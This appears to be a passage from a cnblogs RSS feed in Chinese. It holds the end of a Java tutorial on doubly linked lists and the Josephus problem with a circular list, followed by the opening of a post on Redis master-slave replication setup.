    boolean flag = false;
    while (true) {
        if (temp == null) {
            break;
        }
        if (temp.no == no) {

            flag = true;
            break;
        }
        temp = temp.next;
    }

    if (flag) {

        temp.pre.next = temp.next;

        if (temp.next != null) {
            temp.next.pre = temp.pre;
        }
    } else {
        System.out.printf(&quot;要删除的 %d 节点不存在\n&quot;, no);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;49、双向链表测试&quot;&gt;4.9、双向链表测试&lt;/h3&gt;
&lt;h4 id=&quot;491、测试代码&quot;&gt;4.9.1、测试代码&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {

    System.out.println(&quot;双向链表的测试&quot;);

    HeroNode hero1 = new HeroNode(1, &quot;宋江&quot;, &quot;及时雨&quot;);
    HeroNode hero2 = new HeroNode(2, &quot;卢俊义&quot;, &quot;玉麒麟&quot;);
    HeroNode hero3 = new HeroNode(3, &quot;吴用&quot;, &quot;智多星&quot;);
    HeroNode hero4 = new HeroNode(5, &quot;林冲&quot;, &quot;豹子头&quot;);

    DoubleLinkedList doubleLinkedList = new DoubleLinkedList();
    doubleLinkedList.add(hero1);
    doubleLinkedList.add(hero2);
    doubleLinkedList.add(hero3);
    doubleLinkedList.add(hero4);

    doubleLinkedList.list();

    doubleLinkedList.addByOrder(new HeroNode(4, &quot;Heygo&quot;, &quot;Heygogo&quot;));
    doubleLinkedList.addByOrder(new HeroNode(6, &quot;Oneby&quot;, &quot;Onebyone&quot;));
    System.out.println(&quot;按顺序插入后的情况&quot;);
    doubleLinkedList.list();

    HeroNode newHeroNode = new HeroNode(5, &quot;公孙胜&quot;, &quot;入云龙&quot;);
    doubleLinkedList.update(newHeroNode);
    System.out.println(&quot;修改后的链表情况&quot;);
    doubleLinkedList.list();

    doubleLinkedList.del(3);
    System.out.println(&quot;删除后的链表情况~~&quot;);
    doubleLinkedList.list();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;492、程序运行结果&quot;&gt;4.9.2、程序运行结果&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;&amp;amp;#x53CC;&amp;amp;#x5411;&amp;amp;#x94FE;&amp;amp;#x8868;&amp;amp;#x7684;&amp;amp;#x6D4B;&amp;amp;#x8BD5;
HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickname=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickname=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickname=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=5, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickname=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
&amp;amp;#x6309;&amp;amp;#x987A;&amp;amp;#x5E8F;&amp;amp;#x63D2;&amp;amp;#x5165;&amp;amp;#x540E;&amp;amp;#x7684;&amp;amp;#x60C5;&amp;amp;#x51B5;
HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickname=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickname=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickname=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=4, name=Heygo, nickname=Heygogo]
HeroNode [no=5, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickname=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
HeroNode [no=6, name=Oneby, nickname=Onebyone]
&amp;amp;#x4FEE;&amp;amp;#x6539;&amp;amp;#x540E;&amp;amp;#x7684;&amp;amp;#x94FE;&amp;amp;#x8868;&amp;amp;#x60C5;&amp;amp;#x51B5;
HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickname=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickname=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickname=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=4, name=Heygo, nickname=Heygogo]
HeroNode [no=5, name=&amp;amp;#x516C;&amp;amp;#x5B59;&amp;amp;#x80DC;, nickname=&amp;amp;#x5165;&amp;amp;#x4E91;&amp;amp;#x9F99;]
HeroNode [no=6, name=Oneby, nickname=Onebyone]
&amp;amp;#x5220;&amp;amp;#x9664;&amp;amp;#x540E;&amp;amp;#x7684;&amp;amp;#x94FE;&amp;amp;#x8868;&amp;amp;#x60C5;&amp;amp;#x51B5;~~
HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickname=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickname=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=4, name=Heygo, nickname=Heygogo]
HeroNode [no=5, name=&amp;amp;#x516C;&amp;amp;#x5B59;&amp;amp;#x80DC;, nickname=&amp;amp;#x5165;&amp;amp;#x4E91;&amp;amp;#x9F99;]
HeroNode [no=6, name=Oneby, nickname=Onebyone]
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;410、双向链表所有代码&quot;&gt;4.10、双向链表所有代码&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class DoubleLinkedListDemo {

        public static void main(String[] args) {

                System.out.println(&quot;双向链表的测试&quot;);

                HeroNode hero1 = new HeroNode(1, &quot;宋江&quot;, &quot;及时雨&quot;);
                HeroNode hero2 = new HeroNode(2, &quot;卢俊义&quot;, &quot;玉麒麟&quot;);
                HeroNode hero3 = new HeroNode(3, &quot;吴用&quot;, &quot;智多星&quot;);
                HeroNode hero4 = new HeroNode(5, &quot;林冲&quot;, &quot;豹子头&quot;);

                DoubleLinkedList doubleLinkedList = new DoubleLinkedList();
                doubleLinkedList.add(hero1);
                doubleLinkedList.add(hero2);
                doubleLinkedList.add(hero3);
                doubleLinkedList.add(hero4);

                doubleLinkedList.list();

                doubleLinkedList.addByOrder(new HeroNode(0, &quot;Kobe&quot;, &quot;BlackMamba&quot;));
                doubleLinkedList.addByOrder(new HeroNode(4, &quot;Heygo&quot;, &quot;Heygogo&quot;));
                doubleLinkedList.addByOrder(new HeroNode(6, &quot;Oneby&quot;, &quot;Onebyone&quot;));
                System.out.println(&quot;按顺序插入后的情况&quot;);
                doubleLinkedList.list();

                HeroNode newHeroNode = new HeroNode(5, &quot;公孙胜&quot;, &quot;入云龙&quot;);
                doubleLinkedList.update(newHeroNode);
                System.out.println(&quot;修改后的链表情况&quot;);
                doubleLinkedList.list();

                doubleLinkedList.del(3);
                System.out.println(&quot;删除后的链表情况~~&quot;);
                doubleLinkedList.list();
        }

}

class DoubleLinkedList {

        private HeroNode head = new HeroNode(0, &quot;&quot;, &quot;&quot;);

        public HeroNode getHead() {
                return head;
        }

        public void list() {

                if (head.next == null) {
                        System.out.println(&quot;链表为空&quot;);
                        return;
                }

                HeroNode temp = head.next;
                while (true) {

                        if (temp == null) {
                                break;
                        }

                        System.out.println(temp);

                        temp = temp.next;
                }
        }

        public void add(HeroNode heroNode) {

                HeroNode temp = head;

                while (true) {

                        if (temp.next == null) {
                                break;
                        }

                        temp = temp.next;
                }

                temp.next = heroNode;
                heroNode.pre = temp;
        }

        public void addByOrder(HeroNode heroNode) {

                HeroNode temp = head;
                boolean flag = false;
                while (true) {
                        if (temp.next == null) {
                                break;
                        }
                        if (temp.next.no &amp;gt; heroNode.no) {
                                break;
                        } else if (temp.next.no == heroNode.no) {
                                flag = true;
                                break;
                        }
                        temp = temp.next;
                }

                if (flag) {
                        System.out.printf(&quot;准备插入的英雄的编号 %d 已经存在了, 不能加入\n&quot;, heroNode.no);
                } else {

                        heroNode.next = temp.next;
                        if(temp.next != null) {
                                temp.next.pre = heroNode;
                        }

                        temp.next = heroNode;
                        heroNode.pre = temp;
                }
        }

        public void update(HeroNode newHeroNode) {

                if (head.next == null) {
                        System.out.println(&quot;链表为空~&quot;);
                        return;
                }

                HeroNode temp = head.next;
                boolean flag = false;
                while (true) {
                        if (temp == null) {
                                break;
                        }
                        if (temp.no == newHeroNode.no) {

                                flag = true;
                                break;
                        }
                        temp = temp.next;
                }

                if (flag) {
                        temp.name = newHeroNode.name;
                        temp.nickname = newHeroNode.nickname;
                } else {
                        System.out.printf(&quot;没有找到 编号 %d 的节点，不能修改\n&quot;, newHeroNode.no);
                }
        }

        public void del(int no) {

                if (head.next == null) {
                        System.out.println(&quot;链表为空，无法删除&quot;);
                        return;
                }

                HeroNode temp = head.next;
                boolean flag = false;
                while (true) {
                        if (temp == null) {
                                break;
                        }
                        if (temp.no == no) {

                                flag = true;
                                break;
                        }
                        temp = temp.next;
                }

                if (flag) {

                        temp.pre.next = temp.next;

                        if (temp.next != null) {
                                temp.next.pre = temp.pre;
                        }
                } else {
                        System.out.printf(&quot;要删除的 %d 节点不存在\n&quot;, no);
                }
        }

}

class HeroNode {
        public int no;
        public String name;
        public String nickname;
        public HeroNode next;
        public HeroNode pre;

        public HeroNode(int no, String name, String nickname) {
                this.no = no;
                this.name = name;
                this.nickname = nickname;
        }

        @Override
        public String toString() {
                return &quot;HeroNode [no=&quot; + no + &quot;, name=&quot; + name + &quot;, nickname=&quot; + nickname + &quot;]&quot;;
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;411、总结&quot;&gt;4.11、总结&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;辅助变量 temp ，相当于一个指针，指向 &lt;strong&gt;当前节点&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;如果定位至当前节点会丢失前一个节点的信息，那么我们只能定位至待操作节点的前一个节点：使用 &lt;strong&gt;temp.next&lt;/strong&gt; 进行条件判断&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;5、单向环形链表&quot;&gt;5、单向环形链表&lt;/h2&gt;
&lt;h3 id=&quot;51、单向环形链表应用场景&quot;&gt;5.1、单向环形链表应用场景&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Josephu 问题为： 设编号为 1， 2， ... n 的 n 个人围坐一圈， 约定编号为 k（1&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzE0MTE1NDAwOTQ3LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;52、单向环形链表图解&quot;&gt;5.2、单向环形链表图解&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzE0MTE1NDQ0MTI5LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;53、josephu-问题&quot;&gt;5.3、Josephu 问题&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;用一个不带头结点的循环链表来处理 Josephu 问题： 先构成一个有 n 个结点的 &lt;strong&gt;单循环链表&lt;/strong&gt;， 然后由 k 结点起从 1 开始计数， 计到 m 时， 对应结点从链表中删除， 然后再从被删除结点的下一个结点又从 1 开始计数， 直到最后一个结点从链表中删除算法结束。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzI2MTEzMjU0MDc1LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;54、环形链表的构建与遍历&quot;&gt;5.4、环形链表的构建与遍历&lt;/h3&gt;
&lt;h4 id=&quot;541、boy-节点的定义&quot;&gt;5.4.1、Boy 节点的定义&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;Boy 节点就是个普普通通的单向链表节点&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
class Boy {
        private int no;
        private Boy next;

        public Boy(int no) {
                this.no = no;
        }

        public int getNo() {
                return no;
        }

        public void setNo(int no) {
                this.no = no;
        }

        public Boy getNext() {
                return next;
        }

        public void setNext(Boy next) {
                this.next = next;
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;542、单向循环链表的定义&quot;&gt;5.4.2、单向循环链表的定义&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;first 节点为单向循环链表的 &lt;strong&gt;首节点&lt;/strong&gt;，是真实 &lt;strong&gt;存放数据&lt;/strong&gt;的节点，不是头结点&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
class CircleSingleLinkedList {

        private Boy first = null;

&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;543、构建单向循环链表&quot;&gt;5.4.3、构建单向循环链表&lt;/h4&gt;
&lt;h5 id=&quot;1、代码思路&quot;&gt;1、代码思路&lt;/h5&gt;
&lt;ul&gt;&lt;li&gt;长度为 1 的情况：
&lt;ul&gt;&lt;li&gt;新创建的 boy 节点即是首节点： &lt;strong&gt;first = boy;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;自封闭（自己构成环形链表）： &lt;strong&gt;first.setNext(first);&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;此时 first 节点既是首节点，也是尾节点，辅助指针也指向 first ： &lt;strong&gt;curBoy = first;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;长度不为 1 的情况：
&lt;ul&gt;&lt;li&gt;将 boy 节点添加至环形链表的最后： &lt;strong&gt;curBoy.setNext(boy);&lt;/strong&gt; ，curBoy 节点永远是环形链表的尾节点&lt;/li&gt;
&lt;li&gt;构成环形链表（最）： &lt;strong&gt;boy.setNext(first);&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;辅助指针后移，指向环形链表的尾节点： *&lt;em&gt;curBoy = boy;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzI2MTEzMzAxMTUzLnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;2、代码实现&quot;&gt;2、代码实现&lt;/h5&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void addBoy(int nums) {

    if (nums &amp;lt; 1) {
        System.out.println(&quot;nums的值不正确&quot;);
        return;
    }
    Boy curBoy = null;

    for (int i = 1; i  nums; i++) {

        Boy boy = new Boy(i);

        if (i == 1) {
            first = boy;
            first.setNext(first);
            curBoy = first;
        } else {
            curBoy.setNext(boy);
            boy.setNext(first);
            curBoy = boy;
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;544、遍历单向循环链表&quot;&gt;5.4.4、遍历单向循环链表&lt;/h4&gt;
&lt;h5 id=&quot;1、代码思路-1&quot;&gt;1、代码思路&lt;/h5&gt;
&lt;ul&gt;&lt;li&gt;定义辅助变量 curBoy ，相当于一个指针，指向 &lt;strong&gt;当前节点&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;何时退出 while 循环？当 curBoy 已经指向环形链表的尾节点： *&lt;em&gt;curBoy.getNext() == first&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;2、代码实现-1&quot;&gt;2、代码实现&lt;/h5&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void showBoy() {

    if (first == null) {
        System.out.println(&quot;没有任何小孩~~&quot;);
        return;
    }

    Boy curBoy = first;
    while (true) {
        System.out.printf(&quot;小孩的编号 %d \n&quot;, curBoy.getNo());
        if (curBoy.getNext() == first) {
            break;
        }
        curBoy = curBoy.getNext();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;55、解决-josephu-问题&quot;&gt;5.5、解决 Josephu 问题&lt;/h3&gt;
&lt;h4 id=&quot;551、代码思路&quot;&gt;5.5.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;辅助变量 helper ：helper 永都指向 &lt;strong&gt;环形链表的尾节点&lt;/strong&gt;，环形链表的尾节点永远都指向首节点，可得出： &lt;strong&gt;helper.getNext() == first&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;如何将 helper 定位至环形链表的尾节点？
&lt;ul&gt;&lt;li&gt;初始化时，让 &lt;strong&gt;helper = first&lt;/strong&gt; ，此时 helper 指向环形链表的首节点&lt;/li&gt;
&lt;li&gt;while 循环终止条件？ &lt;strong&gt;helper.getNext() == first&lt;/strong&gt; ：此时 helper 已经移动至环形链表的尾节点&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;如何定位至第 startNo 个节点？如果想要定位至第 2 个节点，那么则需要让 first 和 helper 都移动 1 步，所以让 first 和 helper 都移动 (startNo - 1)步即可&lt;/li&gt;
&lt;li&gt;如何数 nums 下？让 first 和 helper 都移动 (nums - 1)步即可&lt;/li&gt;
&lt;li&gt;如何实现出圈？
&lt;ul&gt;&lt;li&gt;我们需要将 first 指向的节点出圈，first 前一个节点的地址在 helper 中存着（环形链表）&lt;/li&gt;
&lt;li&gt;先让 first 后移一步： &lt;strong&gt;first = first.getNext;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;出圈： &lt;strong&gt;helper.setNext(first);&lt;/strong&gt; ，原来的 first 节点由于没有任何引用，便会被垃圾回收机制回收&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;while 循环终止条件？圈中只剩一人： *&lt;em&gt;helper == first&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzI2MTEzNDQ4ODgwLnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;552、代码实现&quot;&gt;5.5.2、代码实现&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void countBoy(int startNo, int countNum, int nums) {

        if (first == null || startNo &amp;lt; 1 || startNo &amp;gt; nums) {
                System.out.println(&quot;参数输入有误， 请重新输入&quot;);
                return;
        }

        Boy helper = first;

        while (true) {
                if (helper.getNext() == first) {
                        break;
                }
                helper = helper.getNext();
        }

        for (int j = 0; j &amp;lt; startNo - 1; j++) {
                first = first.getNext();
                helper = helper.getNext();
        }

        while (true) {
                if (helper == first) {
                        break;
                }

                for (int j = 0; j &amp;lt; countNum - 1; j++) {
                        first = first.getNext();
                        helper = helper.getNext();
                }

                System.out.printf(&quot;小孩%d出圈\n&quot;, first.getNo());

                first = first.getNext();
                helper.setNext(first);

        }
        System.out.printf(&quot;最后留在圈中的小孩编号%d \n&quot;, first.getNo());

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;56、josephu-问题测试&quot;&gt;5.6、Josephu 问题测试&lt;/h3&gt;
&lt;h4 id=&quot;561、测试代码&quot;&gt;5.6.1、测试代码&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {

    CircleSingleLinkedList circleSingleLinkedList = new CircleSingleLinkedList();
    circleSingleLinkedList.addBoy(5);
    circleSingleLinkedList.showBoy();

    circleSingleLinkedList.countBoy(1, 2, 3);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;562、程序运行结果&quot;&gt;5.6.2、程序运行结果&lt;/h4&gt;
&lt;pre&gt;
&lt;code&gt;&amp;amp;#x5C0F;&amp;amp;#x5B69;&amp;amp;#x7684;&amp;amp;#x7F16;&amp;amp;#x53F7; 1
&amp;amp;#x5C0F;&amp;amp;#x5B69;&amp;amp;#x7684;&amp;amp;#x7F16;&amp;amp;#x53F7; 2
&amp;amp;#x5C0F;&amp;amp;#x5B69;&amp;amp;#x7684;&amp;amp;#x7F16;&amp;amp;#x53F7; 3
&amp;amp;#x5C0F;&amp;amp;#x5B69;&amp;amp;#x7684;&amp;amp;#x7F16;&amp;amp;#x53F7; 4
&amp;amp;#x5C0F;&amp;amp;#x5B69;&amp;amp;#x7684;&amp;amp;#x7F16;&amp;amp;#x53F7; 5
&amp;amp;#x5C0F;&amp;amp;#x5B69;2&amp;amp;#x51FA;&amp;amp;#x5708;
&amp;amp;#x5C0F;&amp;amp;#x5B69;4&amp;amp;#x51FA;&amp;amp;#x5708;
&amp;amp;#x5C0F;&amp;amp;#x5B69;1&amp;amp;#x51FA;&amp;amp;#x5708;
&amp;amp;#x5C0F;&amp;amp;#x5B69;5&amp;amp;#x51FA;&amp;amp;#x5708;
&amp;amp;#x6700;&amp;amp;#x540E;&amp;amp;#x7559;&amp;amp;#x5728;&amp;amp;#x5708;&amp;amp;#x4E2D;&amp;amp;#x7684;&amp;amp;#x5C0F;&amp;amp;#x5B69;&amp;amp;#x7F16;&amp;amp;#x53F7;3
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;57、josephu-问题所有代码&quot;&gt;5.7、Josephu 问题所有代码&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Josepfu {

        public static void main(String[] args) {

                CircleSingleLinkedList circleSingleLinkedList = new CircleSingleLinkedList();
                circleSingleLinkedList.addBoy(5);
                circleSingleLinkedList.showBoy();

                circleSingleLinkedList.countBoy(1, 2, 3);
        }

}

class CircleSingleLinkedList {

        private Boy first = null;

        public void addBoy(int nums) {

                if (nums &amp;lt; 1) {
                        System.out.println(&quot;nums的值不正确&quot;);
                        return;
                }
                Boy curBoy = null;

                for (int i = 1; i  nums; i++) {

                        Boy boy = new Boy(i);

                        if (i == 1) {
                                first = boy;
                                first.setNext(first);
                                curBoy = first;
                        } else {
                                curBoy.setNext(boy);
                                boy.setNext(first);
                                curBoy = boy;
                        }
                }
        }

        public void showBoy() {

                if (first == null) {
                        System.out.println(&quot;没有任何小孩~~&quot;);
                        return;
                }

                Boy curBoy = first;
                while (true) {
                        System.out.printf(&quot;小孩的编号 %d \n&quot;, curBoy.getNo());
                        if (curBoy.getNext() == first) {
                                break;
                        }
                        curBoy = curBoy.getNext();
                }
        }

        public void countBoy(int startNo, int countNum, int nums) {

                if (first == null || startNo &amp;lt; 1 || startNo &amp;gt; nums) {
                        System.out.println(&quot;参数输入有误， 请重新输入&quot;);
                        return;
                }

                Boy helper = first;

                while (true) {
                        if (helper.getNext() == first) {
                                break;
                        }
                        helper = helper.getNext();
                }

                for (int j = 0; j &amp;lt; startNo - 1; j++) {
                        first = first.getNext();
                        helper = helper.getNext();
                }

                while (true) {
                        if (helper == first) {
                                break;
                        }

                        for (int j = 0; j &amp;lt; countNum - 1; j++) {
                                first = first.getNext();
                                helper = helper.getNext();
                        }

                        System.out.printf(&quot;小孩%d出圈\n&quot;, first.getNo());

                        first = first.getNext();
                        helper.setNext(first);

                }
                System.out.printf(&quot;最后留在圈中的小孩编号%d \n&quot;, first.getNo());

        }
}

class Boy {
        private int no;
        private Boy next;

        public Boy(int no) {
                this.no = no;
        }

        public int getNo() {
                return no;
        }

        public void setNo(int no) {
                this.no = no;
        }

        public Boy getNext() {
                return next;
        }

        public void setNext(Boy next) {
                this.next = next;
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;58、总结&quot;&gt;5.8、总结&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;操作单向链表：对于插入、删除操作，只能定位至待操作节点的前一个节点，如果定位至当前节点，那么其上一个节点的信息便会丢失&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Mon, 21 Dec 2020 00:48:00 +0000</pubDate>
<dc:creator>全栈小刘</dc:creator>
<og:description>欧克！欧克！小刘今天带大家来学习一下链表 ，你要是学不会，你来捶我 1、链表(Linked List)介绍 1.1、内存结构 内存上来看：链表存储空间 不连续（不像数组） 1.2、逻辑结构 逻辑上来看</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/spiritmark/p/14166314.html</dc:identifier>
</item>
<item>
<title> 跟我一起学Redis之高可用从主从复制开始 - Code综艺圈</title>
<link>http://www.cnblogs.com/zoe-zyq/p/14166298.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zoe-zyq/p/14166298.html</guid>
<description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
&lt;p&gt;现在遇到高并发场景时，缓存技术应该算是性能优化的第一步，缓解数据库压力的同时还能提高访问效率，而Redis应该是绝大多数应用场景的首选。但是尽快Redis性能再优秀，在当今高并发场景下，一台服务器负责读写，机器的性能和内存的瓶颈肯定避免不了，到这肯定有小伙伴会想到集群， 对的，思路没错，只是在集群之前，主从复制模式的优化策略能解决很多问题，如果主从模式还抗不住高并发，那再来集群也不晚；这里先来说说Redis的主从复制。&lt;/p&gt;
&lt;p&gt;为了更好的演示，搞了一台云服务器，Linux环境； 方便的同时，也能更符合实际应用场景；&lt;/p&gt;
&lt;h3 id=&quot;正文&quot;&gt;正文&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;主从复制&lt;/strong&gt;：主从指有多台Redis服务器，其中一台为主服务器，其他为从服务器，可以通过命令或配置实现主从关系；复制指将主服务器的数据同步到从服务器，数据只能从主服务器向从服务器单向同步；其作用如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;读写分离&lt;/strong&gt;：主服务器复制写，各从服务器负责读；根据二八原则，80%的操作都是读，只有20%进行写，所以在一定程度上也解决了单机瓶颈问题；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据持久化更加安全&lt;/strong&gt;：主从多台服务器进行持久化操作，任意一台服务宕机也不会影响数据恢复，避免了单点故障问题；&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;其他&lt;/strong&gt;：主从复制是实现哨兵模式和Redis集群的前提，这个后续会说到。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;好啦，老规矩，了解其作用之后，接下来就先实操再总结。&lt;/p&gt;
&lt;h4 id=&quot;实现主从复制&quot;&gt;实现主从复制&lt;/h4&gt;
&lt;p&gt;每一台Redis服务器启动时，默认都是主服务器(Master)，可以通过命令&lt;code&gt;info replication&lt;/code&gt;查看，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/17/yPTVFBYjo68O52J.png?ynotemdtimestamp=1608300254339&quot; alt=&quot;image-20201217153936026&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;开始实操搭建一主二从的环境，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/12/18/ejyR7YWDqwnmgIl.png?ynotemdtimestamp=1608300254339&quot; alt=&quot;image-20201218123349514&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 配置文件修改&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于是在同一台机器上模拟，所以将redis配置文件拷贝三份出来，主要修改项如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;配置文件名称：分别为redis.conf、redis6388.conf、redis6399.conf；&lt;/li&gt;
&lt;li&gt;port：端口，三个配置文件分别修改为6379、6388、6399，这是为了避免同一台机器演示端口冲突；&lt;/li&gt;
&lt;li&gt;pidfile：修改此文件名，避免文件冲突，改文件名即可，分别修改为redis.pid、redis6388.pid、redis6399.pid；&lt;/li&gt;
&lt;li&gt;dbfilename：持久化文件名，避免持久化文件冲突，分别修改为dump.rdb、dump6388.rdb、dump6399.rdb；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;2. 启动redis服务器&lt;/strong&gt;&lt;/p&gt;
